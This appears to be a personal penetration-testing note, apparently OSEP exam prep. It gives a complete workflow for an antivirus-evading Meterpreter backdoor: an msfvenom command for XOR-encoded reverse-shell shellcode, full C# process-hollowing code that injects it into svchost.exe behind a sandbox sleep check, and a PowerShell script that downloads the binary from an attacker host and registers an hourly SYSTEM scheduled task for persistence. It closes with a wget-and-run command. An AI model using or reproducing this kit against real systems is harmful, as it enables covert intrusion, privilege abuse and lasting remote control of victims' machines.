# Meterpreter AV Bypass
This workflow works great for persistence when on a box. Everytime you root a machine, make sure you install the backdoor with this method.

## Payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 --encrypt xor --encrypt-key $(printf "\x6A") -f csharp
```

## Process Hollowing: (https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing)
Make sure you add the decoding routing to the byte that you generated. In this case it is x6A
```
﻿using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // add shellcode here:

            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

            // Carrying on, decode the XOR payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0x6A);
            }
            Console.WriteLine("XOR-decoded payload.");

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}
```

## Build on Linux
```
mcs proccesshollowingcs -r:System.Security.dll -out:met.exe
```

## backdoor.ps1
Host this file in /var/www/html/
```
$Url          = "http://192.168.x.x/met.exe"          # ← your IP/port
$OutputPath   = "C:\Windows\Tasks\met.exe"                
$TaskName     = "backdoor"
$TaskCommand  = $OutputPath

Write-Host "[*] Starting download..." -ForegroundColor Cyan

try {
    # Step 1: Download the executable
    Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Downloaded to $OutputPath" -ForegroundColor Green

    # Step 2: Create scheduled task (SYSTEM, hourly, long but safe duration)
    $action = New-ScheduledTaskAction -Execute $TaskCommand

    # Fixed trigger: repeat every 1 hour for 999 days (safe max)
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
                                        -RepetitionInterval (New-TimeSpan -Hours 1) `
                                        -RepetitionDuration (New-TimeSpan -Days 999)

    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
                                            -LogonType ServiceAccount `
                                            -RunLevel Highest

    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries `
                                             -DontStopIfGoingOnBatteries `
                                             -ExecutionTimeLimit (New-TimeSpan -Days 999)

    Register-ScheduledTask -TaskName $TaskName `
                           -Action $action `
                           -Trigger $trigger `
                           -Principal $principal `
                           -Settings $settings `
                           -Force -ErrorAction Stop | Out-Null

    Write-Host "[+] Scheduled task '$TaskName' created (hourly, SYSTEM, 999 days)" -ForegroundColor Green

    # Step 3: Run it immediately
    Start-ScheduledTask -TaskName $TaskName -ErrorAction Stop
    Write-Host "[+] Task '$TaskName' started" -ForegroundColor Green
    Write-Host "You should now receive a connection" -ForegroundColor Yellow
}
catch {
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
```

## Action:
All you need to do is the below command. This will download the compiled reverse shell, schedule a task hourly and run it immediatly. You will obtain a shell every hour for persistence.
```
wget http://<Kali machine>/backdoor.ps1 -O backdoor.ps1
.\backdoor.ps1
```
https://raw.githubusercontent.com/cuongnguyen-git/osep/refs/heads/main/runner/backdoor.png
https://raw.githubusercontent.com/cuongnguyen-git/osep/refs/heads/main/runner/shell.png
